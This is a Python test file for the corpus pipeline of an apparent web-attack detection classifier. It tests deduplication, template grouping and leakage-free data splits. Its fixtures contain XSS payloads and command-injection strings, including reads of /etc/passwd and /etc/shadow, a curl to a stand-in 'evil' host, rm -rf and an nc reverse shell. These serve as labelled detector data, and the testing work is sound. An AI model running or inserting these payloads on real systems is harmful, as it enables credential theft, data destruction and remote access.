"""Corpus discipline: dedup, grouping, stratification, leakage."""

from __future__ import annotations

from csf.data.corpus import (
    AttackClass,
    Request,
    content_hash,
    deduplicate,
    group_key,
    split_by_group,
    verify_no_leakage,
)


def req(path="/a", query="", body="", label=AttackClass.BENIGN,
        source="csic2010", headers=None):
    return Request(method="GET", path=path, query=query, body=body,
                   label=label, source=source,
                   headers=headers or {"host": ["h"]})


# -- normalisation / dedup ------------------------------------------------


def test_session_cookies_do_not_defeat_dedup():
    """Every CSIC request has a unique JSESSIONID. If cookies counted toward
    identity, nothing would ever deduplicate."""
    a = req(headers={"host": ["h"], "cookie": ["JSESSIONID=AAA"]})
    b = req(headers={"host": ["h"], "cookie": ["JSESSIONID=BBB"]})
    assert content_hash(a) == content_hash(b)


def test_encoding_and_param_order_do_not_defeat_dedup():
    assert content_hash(req(query="a=1%20OR%201&b=2")) == \
           content_hash(req(query="b=2&a=1+OR+1"))


def test_different_values_are_not_duplicates():
    assert content_hash(req(query="q=lamp")) != content_hash(req(query="q=desk"))


def test_label_conflicts_are_dropped_not_guessed():
    """The same content labelled both benign and attack is a corpus defect.
    Picking one would teach the model noise."""
    rows = [req(query="q=x", label=AttackClass.BENIGN),
            req(query="q=x", label=AttackClass.SQLI),
            req(query="q=clean")]
    kept, stats = deduplicate(rows)
    assert stats.label_conflicts == 1
    assert len(kept) == 1
    assert kept[0].query == "q=clean"


def test_dedup_counts_are_reported():
    rows = [req(query="q=a")] * 5 + [req(query="q=b")]
    kept, stats = deduplicate(rows)
    assert stats.total_in == 6
    assert stats.exact_duplicates == 4
    assert stats.kept == 2


# -- grouping -------------------------------------------------------------


def test_generated_traffic_groups_by_template():
    """Same endpoint and parameter shapes = same generator template."""
    a = req(path="/shop/add.jsp", query="id=3&qty=55")
    b = req(path="/shop/add.jsp", query="id=9&qty=12")
    assert group_key(a) == group_key(b)


def test_different_parameter_names_are_different_templates():
    assert group_key(req(query="id=1")) != group_key(req(query="name=1"))


def test_value_type_change_is_a_different_template():
    assert group_key(req(query="id=1")) != group_key(req(query="id=abc"))


def test_payload_lists_group_by_skeleton_not_template():
    """Payload lists share one synthetic endpoint. Template grouping would
    collapse an entire class into one group, which measurably put ZERO
    command-injection samples in the test set."""
    a = req(query="q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E", source="xssdb",
            label=AttackClass.XSS)
    b = req(query="q=%3Cimg+src%3Dx+onerror%3Dalert(99)%3E", source="xssdb",
            label=AttackClass.XSS)
    c = req(query="q=%3Csvg%2Fonload%3Dalert(1)%3E", source="xssdb",
            label=AttackClass.XSS)
    assert group_key(a) == group_key(b), "near-duplicates must not straddle a split"
    assert group_key(a) != group_key(c), "distinct payloads must be splittable"


# -- splitting ------------------------------------------------------------


def _mixed_corpus():
    rows = []
    for i in range(300):
        rows.append(req(path=f"/p{i % 30}", query=f"id={i}&n=x{i}",
                        label=AttackClass.BENIGN))
    # Genuinely distinct payloads. Using "payload-variant-{i}" would be wrong
    # test data: _payload_skeleton strips digits, so every variant collapses
    # into ONE group and the class becomes unsplittable — which is exactly
    # the condition split_warnings() exists to report.
    xss_payloads = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>", "javascript:alert(document.cookie)",
        "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
        "\"><script>src=//evil</script>", "<a href=javascript:x>c</a>",
        "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        "<input autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>",
    ]
    for payload in xss_payloads:
        rows.append(req(query=f"q={payload}", source="xssdb",
                        label=AttackClass.XSS))
    cmd_payloads = [
        ";cat /etc/passwd", "| whoami", "`id`", "$(uname -a)",
        "&& curl http://evil/x", "|| ping localhost", "; rm -rf /tmp/z",
        "%0acat%20/etc/shadow", "; nc -e /bin/sh host",
    ]
    for payload in cmd_payloads:
        rows.append(req(query=f"q={payload}", source="cmdi-windows",
                        label=AttackClass.CMDI))
    return rows


def test_split_is_leakage_free():
    split = split_by_group(_mixed_corpus())
    assert verify_no_leakage(split) == []


def test_every_class_appears_in_every_split():
    """A test set missing a class cannot measure that class's recall — the
    metric that stops a weak class hiding behind a strong one."""
    split = split_by_group(_mixed_corpus())
    for name, rows in (("train", split.train), ("val", split.val),
                       ("test", split.test)):
        labels = {r.label for r in rows}
        for expected in (AttackClass.BENIGN, AttackClass.XSS, AttackClass.CMDI):
            assert expected in labels, f"{name} is missing {expected}"


def test_split_is_deterministic():
    a = split_by_group(_mixed_corpus(), seed=42)
    b = split_by_group(_mixed_corpus(), seed=42)
    assert [r.query for r in a.test] == [r.query for r in b.test]


def test_different_seed_gives_different_split():
    a = split_by_group(_mixed_corpus(), seed=1)
    b = split_by_group(_mixed_corpus(), seed=2)
    assert [r.query for r in a.test] != [r.query for r in b.test]


def test_leakage_detector_catches_a_deliberately_bad_split():
    """Guard the guard: verify_no_leakage must actually fail on row-splitting."""
    import random

    from csf.data.corpus import Split
    rows = _mixed_corpus()
    random.Random(0).shuffle(rows)  # noqa: S311 - deterministic test fixture
    bad = Split(train=rows[:300], val=rows[300:390], test=rows[390:])
    problems = verify_no_leakage(bad)
    assert problems, "row-splitting a templated corpus must be flagged as leaking"
    assert any("template groups span" in p for p in problems)


def test_ratios_must_sum_to_one():
    import pytest
    with pytest.raises(ValueError, match="sum to 1.0"):
        split_by_group(_mixed_corpus(), ratios=(0.5, 0.5, 0.5))


def test_split_warnings_report_unsplittable_classes():
    """A class concentrated in one group cannot be split. That is a corpus
    problem and must be reported, not silently produce an empty split."""
    from csf.data.corpus import split_warnings

    rows = [req(query="q=lamp", label=AttackClass.BENIGN) for _ in range(10)]
    rows += [req(query=f"q=x{i}", source="cmdi-windows", label=AttackClass.CMDI)
             for i in range(50)]
    warnings = split_warnings(rows)
    assert any("cmdi" in w for w in warnings)
    assert "cannot be split" in warnings[0]


def test_no_warnings_for_a_diverse_corpus():
    from csf.data.corpus import split_warnings

    assert split_warnings(_mixed_corpus()) == []
